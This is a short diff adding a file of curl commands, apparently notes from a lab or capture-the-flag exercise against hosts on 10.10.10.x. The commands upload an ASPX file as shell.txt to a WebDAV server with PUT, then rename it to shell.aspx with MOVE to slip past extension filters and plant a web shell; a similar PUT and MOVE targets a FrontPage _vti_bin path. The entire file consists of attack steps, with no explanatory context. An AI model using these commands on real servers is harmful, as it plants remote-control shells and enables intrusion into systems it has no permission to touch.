@@ -1,0 +1,12 @@
+curl http://myservice --upload-file file.txt
+
+mv vinot.aspx shell.txt  
+
+curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt 
+
+curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt'     
+
+
+curl -X PUT http://10.10.10.14/_vti_bin/_vti_aut/1.txt --data-binary @1.txt 
+
+curl -X MOVE --header 'Destination:http://10.10.10.14/_vti_bin/_vti_aut/1.txt' 'http://10.10.10.14/1.txt' 
